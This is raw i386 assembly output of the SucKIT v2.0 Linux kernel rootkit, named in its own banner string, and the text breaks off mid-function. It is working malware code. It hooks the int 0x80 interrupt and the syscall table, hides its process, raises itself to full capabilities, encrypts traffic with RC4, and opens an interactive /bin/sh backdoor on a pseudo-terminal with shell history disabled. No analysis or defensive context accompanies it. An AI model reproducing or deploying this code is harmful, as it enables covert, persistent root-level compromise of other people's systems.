	.file	"_kernel.c"
	.type	select,@function
select:
	subl	$52, %esp
	movl	56(%esp), %eax
	movl	%eax, 8(%esp)
	movl	60(%esp), %eax
	movl	%eax, 12(%esp)
	movl	64(%esp), %eax
	movl	%eax, 16(%esp)
	movl	68(%esp), %eax
	movl	%eax, 20(%esp)
	movl	72(%esp), %eax
	movl	%eax, 24(%esp)
	leal	8(%esp), %eax
	pushl	%eax
	pushl	$82
	call __do_syscall;push %eax
	addl	$60, %esp
	ret
.Lfe1:
	.size	select,.Lfe1-select
	.type	socketpair,@function
socketpair:
	subl	$32, %esp
	movl	36(%esp), %eax
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, 8(%esp)
	movl	44(%esp), %eax
	movl	%eax, 12(%esp)
	movl	48(%esp), %eax
	movl	%eax, 16(%esp)
	leal	4(%esp), %eax
	pushl	%eax
	pushl	$8
	pushl	$102
	call __do_syscall;push %eax
	addl	$44, %esp
	ret
.Lfe2:
	.size	socketpair,.Lfe2-socketpair
	.type	getpeername,@function
getpeername:
	subl	$32, %esp
	movl	36(%esp), %eax
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, 8(%esp)
	movl	44(%esp), %eax
	movl	%eax, 12(%esp)
	leal	4(%esp), %eax
	pushl	%eax
	pushl	$7
	pushl	$102
	call __do_syscall;push %eax
	addl	$44, %esp
	ret
.Lfe3:
	.size	getpeername,.Lfe3-getpeername
	.type	recv,@function
recv:
	subl	$32, %esp
	movl	36(%esp), %eax
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, 8(%esp)
	movl	44(%esp), %eax
	movl	%eax, 12(%esp)
	movl	48(%esp), %eax
	movl	%eax, 16(%esp)
	leal	4(%esp), %eax
	pushl	%eax
	pushl	$10
	pushl	$102
	call __do_syscall;push %eax
	addl	$44, %esp
	ret
.Lfe4:
	.size	recv,.Lfe4-recv
	.type	socket,@function
socket:
	subl	$32, %esp
	movl	36(%esp), %eax
	movl	%eax, 4(%esp)
	movl	40(%esp), %eax
	movl	%eax, 8(%esp)
	movl	44(%esp), %eax
	movl	%eax, 12(%esp)
	leal	4(%esp), %eax
	pushl	%eax
	pushl	$1
	pushl	$102
	call __do_syscall;push %eax
	addl	$44, %esp
	ret
.Lfe5:
	.size	socket,.Lfe5-socket
	.type	k_hard_write,@function
k_hard_write:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$12, %esp
	movl	40(%esp), %esi
	xorl	%ebx, %ebx
	cmpl	%esi, %ebx
	movl	32(%esp), %ebp
	movl	36(%esp), %edi
	jl	.L14
.L6:
	addl	$12, %esp
	movl	%ebx, %eax
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L14:
	movl	%esi, %eax
	subl	%ebx, %eax
	pushl	%eax
	leal	(%ebx,%edi), %eax
	pushl	%eax
	pushl	%ebp
	pushl	$4
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	js	.L17
	testl	%eax, %eax
	je	.L6
	addl	%eax, %ebx
.L7:
	cmpl	%esi, %ebx
	jl	.L14
	jmp	.L6
.L17:
	cmpl	$-11, %eax
	je	.L7
	cmpl	$-4, %eax
	je	.L7
	jmp	.L6
.Lfe6:
	.size	k_hard_write,.Lfe6-k_hard_write
.globl k_rc4_init
	.type	k_rc4_init,@function
k_rc4_init:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	pushl	%edx
	movl	32(%esp), %edi
	movb	$0, 3(%esp)
.L19:
	movb	3(%esp), %dl
	movzbl	3(%esp), %eax
	movb	%dl, (%eax,%edi)
	incb	%dl
	movb	%dl, 3(%esp)
	jne	.L19
	movb	$0, 257(%edi)
	movb	$0, 256(%edi)
	xorl	%ebp, %ebp
	xorl	%esi, %esi
.L23:
	movzbl	3(%esp), %ecx
	movl	%esi, %ebx
	movb	(%ecx,%edi), %al
	movzbl	%bl, %edx
	movl	24(%esp), %ebx
	addb	(%edx,%ebx), %al
	addl	%eax, %ebp
	movl	%ebp, %edx
	movzbl	%dl, %eax
	leal	(%eax,%edi), %eax
	leal	(%ecx,%edi), %ecx
	movb	(%ecx), %bl
	movb	(%eax), %dl
	incl	%esi
	movb	%dl, (%ecx)
	movb	%bl, (%eax)
	movl	%esi, %ebx
	movzbl	%bl, %eax
	cmpl	28(%esp), %eax
	jl	.L27
	xorl	%esi, %esi
.L27:
	incb	3(%esp)
	jne	.L23
	popl	%eax
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe7:
	.size	k_rc4_init,.Lfe7-k_rc4_init
.globl k_rc4
	.type	k_rc4,@function
k_rc4:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	pushl	%ebx
	movl	32(%esp), %esi
	xorl	%ebp, %ebp
	movb	257(%esi), %al
	cmpl	28(%esp), %ebp
	movzbl	256(%esi), %edi
	movb	%al, 3(%esp)
	jge	.L37
.L35:
	incl	%edi
	movl	%edi, %edx
	movzbl	%dl, %ebx
	movb	(%ebx,%esi), %al
	addb	%al, 3(%esp)
	movzbl	3(%esp), %eax
	leal	(%ebx,%esi), %ebx
	leal	(%eax,%esi), %eax
	movb	(%ebx), %dl
	movb	(%eax), %cl
	movb	%cl, (%ebx)
	movb	%dl, (%eax)
	addb	(%ebx), %dl
	movzbl	%dl, %edx
	movb	(%edx,%esi), %al
	movl	24(%esp), %edx
	xorb	%al, (%ebp,%edx)
	incl	%ebp
	cmpl	28(%esp), %ebp
	jl	.L35
.L37:
	movl	%edi, %eax
	movb	%al, 256(%esi)
	movb	3(%esp), %dl
	movb	%dl, 257(%esi)
	popl	%ecx
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe8:
	.size	k_rc4,.Lfe8-k_rc4
.globl hlen
	.data
	.type	hlen,@object
	.size	hlen,4
hlen:
	.long	0
.globl initialized
	.type	initialized,@object
	.size	initialized,4
initialized:
	.long	0
	.type	initmem,@object
	.size	initmem,4
initmem:
	.long	0
	.type	kernel_hook_table,@object
	.size	kernel_hook_table,1024
kernel_hook_table:
	.long	0
	.zero	1020
.globl my_memmem
	.type	my_memmem,@function
my_memmem:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	movl	32(%esp), %edx
	movl	20(%esp), %ebx
	testl	%edx, %edx
	movl	%ebx, %eax
	je	.L38
	cmpl	%edx, 24(%esp)
	jl	.L47
	xorl	%ebp, %ebp
.L45:
	decl	24(%esp)
	movl	%ebp, %eax
	movl	%ebx, %esi
	movl	28(%esp), %edi
	movl	%edx, %ecx
#APP
	repe
	cmpsb
	je 1f
	sbbl %eax,%eax
	orb $1,%al
1:
#NO_APP
	testl	%eax, %eax
	je	.L48
	incl	%ebx
	cmpl	%edx, 24(%esp)
	jge	.L45
.L47:
	xorl	%eax, %eax
.L38:
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L48:
	movl	%ebx, %eax
	jmp	.L38
.Lfe9:
	.size	my_memmem,.Lfe9-my_memmem
.globl my_atoi
	.type	my_atoi,@function
my_atoi:
	pushl	%ebx
	movl	8(%esp), %ecx
	movb	(%ecx), %dl
	leal	-48(%edx), %eax
	xorl	%ebx, %ebx
	cmpb	$9, %al
	jbe	.L51
	testb	%dl, %dl
	je	.L51
.L54:
	incl	%ecx
	movb	(%ecx), %dl
	leal	-48(%edx), %eax
	cmpb	$9, %al
	jbe	.L51
	testb	%dl, %dl
	jne	.L54
.L51:
	leal	-48(%edx), %eax
	cmpb	$9, %al
	ja	.L61
.L58:
	leal	(%ebx,%ebx,4), %eax
	movsbl	%dl,%edx
	incl	%ecx
	leal	-48(%edx,%eax,2), %ebx
	movb	(%ecx), %dl
	leal	-48(%edx), %eax
	cmpb	$9, %al
	jbe	.L58
.L61:
	movl	%ebx, %eax
	popl	%ebx
	ret
.Lfe10:
	.size	my_atoi,.Lfe10-my_atoi
.globl my_atoi2
	.type	my_atoi2,@function
my_atoi2:
	pushl	%ebx
	movl	8(%esp), %ecx
	xorl	%ebx, %ebx
.L63:
	movb	(%ecx), %al
	cmpb	$32, %al
	je	.L67
	cmpb	$9, %al
	jne	.L64
.L67:
	testb	%al, %al
	je	.L64
	incl	%ecx
	jmp	.L63
.L64:
	movb	%al, %dl
	leal	-48(%edx), %eax
	cmpb	$9, %al
	ja	.L74
.L72:
	leal	(%ebx,%ebx,4), %eax
	movsbl	%dl,%edx
	incl	%ecx
	leal	-48(%edx,%eax,2), %ebx
	movb	(%ecx), %dl
	leal	-48(%edx), %eax
	cmpb	$9, %al
	jbe	.L72
.L74:
	movl	%ebx, %eax
	popl	%ebx
	ret
.Lfe11:
	.size	my_atoi2,.Lfe11-my_atoi2
.globl my_itoa
	.type	my_itoa,@function
my_itoa:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$20, %esp
	movl	44(%esp), %ebx
	movl	40(%esp), %ebp
	testl	%ebx, %ebx
	movl	$0, 12(%esp)
	movl	$1000000000, %esi
	movl	%ebp, %ecx
	jne	.L76
	leal	1(%ebp), %ecx
	movb	$48, (%ebp)
.L77:
	movb	$0, (%ecx)
	addl	$20, %esp
	popl	%ebx
	popl	%esi
	subl	%ebp, %ecx
	popl	%edi
	movl	%ecx, %eax
	popl	%ebp
	ret
.L76:
	movl	$-858993459, %edi
.L84:
	movl	%ebx, %eax
	xorl	%edx, %edx
	divl	%esi
	testb	%al, %al
	movl	%edx, %ebx
	jne	.L81
	movl	12(%esp), %eax
	testl	%eax, %eax
	je	.L83
	movb	$48, (%ecx)
.L86:
	incl	%ecx
.L83:
	movl	%esi, %eax
	mull	%edi
	movl	%edx, 4(%esp)
	movl	4(%esp), %esi
	shrl	$3, %esi
	movl	%eax, (%esp)
	jne	.L84
	jmp	.L77
.L81:
	addl	$48, %eax
	movl	$1, 12(%esp)
	movb	%al, (%ecx)
	jmp	.L86
.Lfe12:
	.size	my_itoa,.Lfe12-my_itoa
	.type	go_sleep,@function
go_sleep:
	pushl	%esi
	pushl	%ebx
	subl	$24, %esp
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %esi
	movl	$-1, 12(%ebx)
	movl	36(%esp), %eax
	movl	%eax, 12(%esp)
	movl	40(%esp), %eax
	movl	%eax, 16(%esp)
	pushl	$0
	leal	16(%esp), %eax
	pushl	%eax
	pushl	$162
	call __do_syscall;push %eax
	movl	%esi, 12(%ebx)
	addl	$36, %esp
	popl	%ebx
	popl	%esi
	ret
.Lfe13:
	.size	go_sleep,.Lfe13-go_sleep
	.type	kernel_hook_init,@function
kernel_hook_init:
	movl	hooks+1, %eax
	testl	%eax, %eax
	pushl	%ebx
	movl	$hooks, %ecx
	je	.L100
	movl	%eax, %edx
	movl	$kernel_hook_table, %ebx
.L98:
	movzbl	(%ecx), %eax
	addl	$5, %ecx
	movl	%edx, (%ebx,%eax,4)
	movl	1(%ecx), %eax
	testl	%eax, %eax
	movl	%eax, %edx
	jne	.L98
.L100:
	popl	%ebx
	ret
.Lfe14:
	.size	kernel_hook_init,.Lfe14-kernel_hook_init
.globl install_new_idt
	.type	install_new_idt,@function
install_new_idt:
	movl	kidt, %edx
	movl	$int80_hook, %eax
	movw	%ax, 1024(%edx)
	shrl	$16, %eax
	movw	%ax, 1030(%edx)
	ret
.Lfe15:
	.size	install_new_idt,.Lfe15-install_new_idt
.globl uninstall_new_idt
	.type	uninstall_new_idt,@function
uninstall_new_idt:
	movl	kidt, %eax
	movw	kernel_old80, %dx
	movw	%dx, 1024(%eax)
	movzwl	kernel_old80+2, %edx
	movw	%dx, 1030(%eax)
	ret
.Lfe16:
	.size	uninstall_new_idt,.Lfe16-uninstall_new_idt
	.data
	.type	n.0,@object
	.size	n.0,4
n.0:
	.long	0
	.type	set_full_caps,@function
set_full_caps:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$48, %esp
	leal	20(%esp), %edi
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %ebp
	movl	$-1, 12(%ebx)
	movl	$0, 12(%esp)
	movl	$0, 16(%esp)
	movl	$0, 20(%esp)
	movl	$0, 24(%esp)
	movl	$0, 28(%esp)
	pushl	%edi
	leal	16(%esp), %esi
	pushl	%esi
	pushl	$184
	call __do_syscall;push %eax
	movl	$0, 28(%esp)
	movl	capoff, %eax
	addl	$12, %esp
	movl	$-1, (%eax,%ebx)
	movl	$-1, 28(%esp)
	movl	$-1, 24(%esp)
	movl	$-1, 20(%esp)
	pushl	%edi
	pushl	%esi
	pushl	$185
	call __do_syscall;push %eax
	pushl	$0
	pushl	$0
	pushl	$0
	pushl	$164
	call __do_syscall;push %eax
	addl	$32, %esp
	pushl	$0
	pushl	$0
	pushl	$0
	pushl	$170
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$n.0
	pushl	$1
	pushl	$81
	call __do_syscall;push %eax
	movl	%ebp, 12(%ebx)
	addl	$60, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe17:
	.size	set_full_caps,.Lfe17-set_full_caps
	.type	find_cap,@function
find_cap:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$48, %esp
	movl	$0, 12(%esp)
	movl	$0, 16(%esp)
	movl	$0, 20(%esp)
	movl	$0, 24(%esp)
	movl	$0, 28(%esp)
	movl	$-8192, %esi
#APP
	andl %esp,%esi; 
#NO_APP
	movl	12(%esi), %eax
	leal	20(%esp), %ebp
	movl	%eax, 8(%esp)
	movl	$-1, 12(%esi)
	pushl	%ebp
	leal	16(%esp), %ebx
	pushl	%ebx
	pushl	$184
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	%ebp
	pushl	%ebx
	pushl	$184
	call __do_syscall;push %eax
	movl	$0, 40(%esp)
	movl	$0, 32(%esp)
	movl	$0, 28(%esp)
	addl	$12, %esp
	pushl	%ebp
	pushl	%ebx
	pushl	$185
	call __do_syscall;push %eax
	xorl	%edi, %edi
	addl	$16, %esp
.L120:
	movl	$0, 4(%ebx)
	pushl	%eax
	pushl	%ebp
	pushl	%ebx
	pushl	$184
	call __do_syscall;push %eax
	movl	(%esi), %edx
	addl	$16, %esp
	cmpl	20(%esp), %edx
	je	.L126
	xorl	%edi, %edi
	addl	$4, %esi
	jmp	.L120
.L126:
	movl	%edi, %ecx
	movl	$-2, %eax
	roll	%cl, %eax
	incl	%edi
	andl	%eax, %edx
	cmpl	$32, %edi
	movl	%edx, 20(%esp)
	movl	$0, 4(%ebx)
	jne	.L120
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	subl	%ebx, %esi
	movl	%esi, capoff
	call	set_full_caps
	movl	4(%esp), %eax
	movl	%eax, 12(%ebx)
	addl	$44, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe18:
	.size	find_cap,.Lfe18-find_cap
.globl kernel_entry
	.type	kernel_entry,@function
kernel_entry:
	pushl	%ebx
	subl	$8, %esp
	movl	kernel_sysaux, %edx
	movl	kernel_sct, %eax
	movl	%edx, 236(%eax)
	call	kernel_hook_init
	call	install_new_idt
	movl	initialized, %edx
	testl	%edx, %edx
	jne	.L128
	pushl	%eax
	pushl	$1
	pushl	$1
	pushl	$37
	call __do_syscall;push %eax
	movl	initialized, %eax
	xorl	%ebx, %ebx
	addl	$16, %esp
	testl	%eax, %eax
	je	.L134
.L139:
	movl	initmem, %eax
	testl	%eax, %eax
	jne	.L127
.L136:
	call	uninstall_new_idt
	xorl	%eax, %eax
.L127:
	addl	$8, %esp
	popl	%ebx
	ret
.L134:
	subl	$8, %esp
	pushl	$333333333
	pushl	$0
	incl	%ebx
	call	go_sleep
	addl	$16, %esp
	cmpl	$9, %ebx
	jg	.L138
	movl	initialized, %eax
	testl	%eax, %eax
	je	.L134
	jmp	.L139
.L138:
	movl	initialized, %eax
	testl	%eax, %eax
	je	.L136
	jmp	.L139
.L128:
	call	hide_me
	call	find_cap
	movl	$501930990, %eax
	jmp	.L127
.Lfe19:
	.size	kernel_entry,.Lfe19-kernel_entry
.globl ualloc
	.type	ualloc,@function
ualloc:
	pushl	%esi
	pushl	%ebx
	subl	$44, %esp
	movl	$-8192, %ebx
#APP
	andl %esp,%ebx; 
#NO_APP
	movl	12(%ebx), %esi
	movl	$-1, 12(%ebx)
	movl	56(%esp), %eax
	addl	$4099, %eax
	andl	$-4096, %eax
	movl	%eax, 12(%esp)
	leal	8(%esp), %eax
	movl	$0, 8(%esp)
	movl	$7, 16(%esp)
	movl	$34, 20(%esp)
	movl	$0, 24(%esp)
	movl	$0, 28(%esp)
	pushl	%eax
	pushl	$90
	call __do_syscall;push %eax
	movl	%eax, %edx
	addl	$16, %esp
	xorl	%eax, %eax
	cmpl	$-1, %edx
	movl	%esi, 12(%ebx)
	je	.L140
	movl	4(%esp), %eax
	movl	%eax, (%edx)
	leal	4(%edx), %eax
.L140:
	addl	$36, %esp
	popl	%ebx
	popl	%esi
	ret
.Lfe20:
	.size	ualloc,.Lfe20-ualloc
.globl ufree
	.type	ufree,@function
ufree:
	subl	$12, %esp
	movl	16(%esp), %edx
	testl	%edx, %edx
	je	.L147
	pushl	%ecx
	pushl	-4(%edx)
	leal	-4(%edx), %eax
	pushl	%eax
	pushl	$91
	call __do_syscall;push %eax
	addl	$16, %esp
.L147:
	addl	$12, %esp
	ret
.Lfe21:
	.size	ufree,.Lfe21-ufree
.globl pid_lock
	.data
	.type	pid_lock,@object
	.size	pid_lock,4
pid_lock:
	.long	0
	.type	hide_me,@function
hide_me:
	subl	$20, %esp
	pushl	$0
	pushl	$20
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$32767, %eax
	movl	%eax, %edx
	ja	.L149
	movl	%eax, %ecx
	andl	$31, %ecx
	movl	$1, %eax
	sall	%cl, %eax
	shrl	$5, %edx
	orl	%eax, pidtab(,%edx,4)
.L149:
	addl	$12, %esp
	ret
.Lfe22:
	.size	hide_me,.Lfe22-hide_me
	.type	suckit_uninstall,@function
suckit_uninstall:
	jmp	uninstall_new_idt
.Lfe23:
	.size	suckit_uninstall,.Lfe23-suckit_uninstall
	.data
	.type	k_crypt_ctx,@object
	.size	k_crypt_ctx,4
k_crypt_ctx:
	.long	1073741824
	.type	k_decrypt_ctx,@object
	.size	k_decrypt_ctx,4
k_decrypt_ctx:
	.long	1073743872
	.type	k_cwrite,@function
k_cwrite:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$12, %esp
	movl	40(%esp), %ebx
	xorl	%eax, %eax
	testl	%ebx, %ebx
	movl	36(%esp), %esi
	jne	.L157
.L153:
	addl	$12, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L157:
	subl	$12, %esp
	pushl	%ebx
	call	ualloc
	movl	%eax, %ebp
	addl	$16, %esp
	xorl	%eax, %eax
	testl	%ebp, %ebp
	je	.L153
	movl	%ebx, %ecx
	movl	%ebp, %edi
#APP
	rep; movsb
#NO_APP
	pushl	%esi
	pushl	k_crypt_ctx
	pushl	%ebx
	pushl	%ebp
	call	k_rc4
	addl	$12, %esp
	pushl	%ebx
	pushl	%ebp
	pushl	44(%esp)
	call	k_hard_write
	movl	%eax, %ebx
	movl	%ebp, (%esp)
	call	ufree
	movl	%ebx, %eax
	addl	$16, %esp
	jmp	.L153
.Lfe24:
	.size	k_cwrite,.Lfe24-k_cwrite
	.type	k_cread,@function
k_cread:
	pushl	%esi
	pushl	%ebx
	pushl	%ebx
	movl	24(%esp), %edx
	xorl	%eax, %eax
	testl	%edx, %edx
	movl	20(%esp), %esi
	jne	.L161
.L158:
	popl	%edx
	popl	%ebx
	popl	%esi
	ret
.L161:
	pushl	%edx
	pushl	%esi
	pushl	24(%esp)
	pushl	$3
	call __do_syscall;push %eax
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %ebx
	jle	.L160
	pushl	%ecx
	pushl	k_decrypt_ctx
	pushl	%eax
	pushl	%esi
	call	k_rc4
	addl	$16, %esp
.L160:
	movl	%ebx, %eax
	jmp	.L158
.Lfe25:
	.size	k_cread,.Lfe25-k_cread
.LC0:
	.string	"SHELL=/bin/bash"
.LC1:
	.string	"PS1=\\u@\\h \\w\\$ "
.LC2:
	.string	"HISTFILE=/dev/null"
	.data
	.type	denv,@object
	.size	denv,1024
denv:
	.long	ebuf1
	.long	ebuf2
	.long	.LC0
	.long	.LC1
	.long	.LC2
	.long	0
	.zero	1000
.LC3:
	.string	"pqrstuvwxyzabcde"
.LC4:
	.string	"0123456789abcdef"
	.type	get_tty,@function
get_tty:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$92, %esp
	leal	48(%esp), %ebp
	movl	$4, %eax
	cld
	movl	%ebp, %edi
	movl	%eax, %ecx
	movl	$.LC3, %esi
	rep
	movsl
	leal	16(%esp), %ebp
	movl	%ecx, 12(%esp)
	movsb
	movl	%eax, %ecx
	movl	%ebp, %edi
	movl	$.LC4, %esi
	rep
	movsl
	movsb
	movl	12(%esp), %ecx
	movl	112(%esp), %ebx
	movl	120(%esp), %edx
	movl	116(%esp), %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	movl	116(%esp), %esi
	movl	%edx, %edi
#APP
	1:	lodsb
	stosb
	testb %al, %al
	jne 1b
	
#NO_APP
	movl	%ebx, %eax
	sarl	$4, %eax
	andl	$15, %eax
	movb	48(%esp,%eax), %al
	movb	%al, (%ecx,%edx)
	andl	$15, %ebx
	movb	16(%esp,%ebx), %al
	movb	%al, 1(%ecx,%edx)
	movb	$0, 2(%ecx,%edx)
	addl	$92, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.Lfe26:
	.size	get_tty,.Lfe26-get_tty
.LC5:
	.string	"/dev/ptmx"
.LC6:
	.string	"/dev/pty"
.LC7:
	.string	"/dev/tty"
	.type	open_tty,@function
open_tty:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$524, %esp
	movl	544(%esp), %ebp
	movl	548(%esp), %edi
	pushl	$0
	pushl	$2
	pushl	$.LC5
	pushl	$5
	call __do_syscall;push %eax
	popl	%edx
	popl	%ecx
	pushl	%eax
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	xorl	%ebx, %ebx
	movl	%esp, %esi
.L172:
	pushl	%eax
	pushl	%esi
	pushl	$.LC6
	pushl	%ebx
	call	get_tty
	pushl	$0
	pushl	$2
	pushl	%esi
	pushl	$5
	call __do_syscall;push %eax
	addl	$32, %esp
	testl	%eax, %eax
	movl	%eax, (%edi)
	js	.L168
	pushl	%eax
	pushl	%esi
	pushl	$.LC7
	pushl	%ebx
	call	get_tty
	pushl	$0
	pushl	$2
	pushl	%esi
	pushl	$5
	call __do_syscall;push %eax
	addl	$32, %esp
	testl	%eax, %eax
	movl	%eax, (%ebp)
	jns	.L171
	subl	$8, %esp
	pushl	(%edi)
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
.L168:
	incl	%ebx
	cmpl	$255, %ebx
	jle	.L172
	xorl	%eax, %eax
.L165:
	addl	$524, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L171:
	movl	$1, %eax
	jmp	.L165
.Lfe27:
	.size	open_tty,.Lfe27-open_tty
.LC8:
	.string	"sh"
	.data
	.type	darg.1,@object
	.size	darg.1,8
darg.1:
	.long	.LC8
	.long	0
.LC9:
	.string	"/bin/sh"
	.type	int_shell,@function
int_shell:
	pushl	%esi
	pushl	%ebx
	subl	$12, %esp
	movl	28(%esp), %esi
	pushl	_pty
	pushl	$6
	call __do_syscall;push %eax
	popl	%eax
	popl	%edx
	pushl	$0
	pushl	$66
	call __do_syscall;push %eax
	pushl	$0
	pushl	$21518
	pushl	%esi
	pushl	$54
	call __do_syscall;push %eax
	movl	$1, %ebx
	addl	$32, %esp
.L180:
	pushl	%eax
	pushl	$0
	pushl	%ebx
	pushl	$48
	incl	%ebx
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$31, %ebx
	jle	.L180
	pushl	%ecx
	pushl	$0
	pushl	%esi
	pushl	$63
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$1
	pushl	%esi
	pushl	$63
	call __do_syscall;push %eax
	addl	$12, %esp
	pushl	$2
	pushl	%esi
	pushl	$63
	call __do_syscall;push %eax
	addl	$16, %esp
	cmpl	$2, %esi
	ja	.L185
.L181:
	subl	$8, %esp
	pushl	$cfg
	pushl	$12
	call __do_syscall;push %eax
	popl	%eax
	popl	%edx
	pushl	$18
	pushl	$60
	call __do_syscall;push %eax
	popl	%ebx
	popl	%esi
	pushl	$0
	pushl	$69
	call __do_syscall;push %eax
	movl	$.LC9, %ebx
	movl	$darg.1, %ecx
	movl	$denv, %edx
	movl	$11, %eax
#APP
	int $0x80
#NO_APP
	addl	$20, %esp
	popl	%ebx
	popl	%esi
	ret
.L185:
	subl	$8, %esp
	pushl	%esi
	pushl	$6
	call __do_syscall;push %eax
	addl	$16, %esp
	jmp	.L181
.Lfe28:
	.size	int_shell,.Lfe28-int_shell
.LC10:
	.string	"\nSucKIT v2.0-devel-rc2 <http://hysteria.sk/sd/sk>\n(c) Copyright 2001-2003 sd <sd@hysteria.sk>\n"
.LC11:
	.string	"Can't open a tty. That's bad.\n"
	.type	interactive,@function
interactive:
	pushl	%ebp
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	subl	$704, %esp
	xorl	%ecx, %ecx
	movl	724(%esp), %ebx
	movl	$.LC10, %edi
	movl	%ecx, %eax
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	pushl	%ecx
	pushl	$.LC10
	pushl	%ebx
	call	k_cwrite
	popl	%ebp
	popl	%eax
	leal	36(%esp), %eax
	pushl	%eax
	leal	36(%esp), %eax
	pushl	%eax
	call	open_tty
	addl	$16, %esp
	testl	%eax, %eax
	jne	.L188
	movl	$.LC11, %edi
	movl	%eax, %ecx
#APP
	decl %ecx
	repnz; scasb
	notl %ecx
	decl %ecx
	
#NO_APP
	pushl	%edi
	pushl	%ecx
	pushl	$.LC11
	pushl	%ebx
	call	k_cwrite
	popl	%ebx
	popl	%esi
	pushl	$0
	pushl	$3
	call	go_sleep
	addl	$16, %esp
.L186:
	addl	$700, %esp
	popl	%ebx
	popl	%esi
	popl	%edi
	popl	%ebp
	ret
.L188:
	movl	28(%esp), %eax
	pushl	%ecx
	pushl	28(%esp)
	pushl	%ebx
	pushl	$int_shell
	movl	%eax, _pty
	call	kernel_thread
	movl	%eax, 28(%esp)
	popl	%eax
	popl	%edx
	pushl	32(%esp)
	pushl	$6
	call __do_syscall;push %eax
.L219:
	addl	$16, %esp
.L218:
	xorl	%eax, %eax
	movl	$128, %ecx
	leal	48(%esp), %edi
#APP
	rep
	stosb
#NO_APP
	movl	28(%esp), %esi
	testl	%esi, %esi
	movl	%esi, %eax
	js	.L221
.L194:
	movl	%eax, %edx
	sarl	$5, %edx
	movl	%edx, %eax
	sall	$5, %eax
	movl	%esi, %ecx
	movl	$1, %edi
	subl	%eax, %ecx
	movl	%edi, %eax
	sall	%cl, %eax
	orl	%eax, 48(%esp,%edx,4)
	testl	%ebx, %ebx
	movl	%ebx, %eax
	js	.L222
.L196:
	movl	%eax, %edx
	sarl	$5, %edx
	movl	%edx, %eax
	sall	$5, %eax
	movl	%ebx, %ecx
	subl	%eax, %ecx
	movl	%edi, %eax
	sall	%cl, %eax
	orl	%eax, 48(%esp,%edx,4)
	subl	$12, %esp
	pushl	$0
	pushl	$0
	pushl	$0
	leal	72(%esp), %edi
	cmpl	%ebx, %esi
	pushl	%edi
	leal	1(%esi), %eax
	jg	.L199
	leal	1(%ebx), %eax
.L199:
	pushl	%eax
	call	select
	addl	$32, %esp
	testl	%eax, %eax
	jle	.L191
	movl	28(%esp), %esi
	testl	%esi, %esi
	movl	%esi, %eax
	js	.L223
.L202:
	movl	%eax, %edx
	sarl	$5, %edx
	movl	%edx, %eax
	sall	$5, %eax
	movl	%esi, %ecx
	movl	$1, %ebp
	subl	%eax, %ecx
	movl	%ebp, %eax
	sall	%cl, %eax
	testl	%eax, 48(%esp,%edx,4)
	jne	.L224
.L201:
	testl	%ebx, %ebx
	movl	%ebx, %eax
	js	.L225
.L206:
	movl	%eax, %edx
	sarl	$5, %edx
	movl	%edx, %eax
	sall	$5, %eax
	movl	%ebx, %ecx
	subl	%eax, %ecx
	movl	%ebp, %eax
	sall	%cl, %eax
	testl	%eax, 48(%esp,%edx,4)
	je	.L218
	pushl	%eax
	pushl	$512
	leal	184(%esp), %esi
	pushl	%esi
	pushl	%ebx
	call	k_cread
	addl	$16, %esp
	testl	%eax, %eax
	movl	%eax, %edx
	jle	.L191
	xorl	%eax, %eax
	movl	%esi, %edi
	movl	%edx, %ecx
#APP
	repne
	scasb
	je 1f
	movl $1,%edi
1:	decl %edi
#NO_APP
	testl	%edi, %edi
	movl	%edi, %ebp
	jne	.L226
	pushl	%edi
	pushl	%edx
	pushl	%esi
.L220:
	pushl	40(%esp)
	call	k_hard_write
	jmp	.L219
.L226:
	addl	%edx, %esi
	movl	%esi, 8(%esp)
	subl	%edi, 8(%esp)
	cmpl	$4, 8(%esp)
	jbe	.L227
	leal	32(%esp), %edi
	movl	$5, %ecx
	movl	%ebp, %esi
#APP
	rep; movsb
#NO_APP
	addl	$5, %ebp
	subl	$5, 8(%esp)
.L214:
